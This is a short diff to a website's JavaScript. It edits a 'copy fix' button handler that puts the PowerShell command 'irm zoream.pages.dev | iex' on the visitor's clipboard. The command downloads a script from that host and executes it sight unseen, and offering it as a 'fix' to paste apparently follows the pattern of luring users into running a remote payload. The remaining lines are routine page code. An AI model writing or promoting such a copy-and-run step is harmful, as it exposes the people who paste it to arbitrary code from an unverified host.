@@ -70,7 +70,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const copyFixBtn = document.getElementById('copyFixBtn');
     if (copyFixBtn) {
         copyFixBtn.addEventListener('click', function () {
-            const code = 'irm zoream.pages.dev/.ps1 | iex';
+            const code = 'irm zoream.pages.dev | iex';
             navigator.clipboard.writeText(code).then(() => {
                 const originalIcon = copyFixBtn.innerHTML;
                 copyFixBtn.innerHTML = '<i class="fas fa-check"></i>';
@@ -307,4 +307,3 @@ document.querySelectorAll('a[href^="#"]').forEach(anchor => {
         }
     });
 });
-
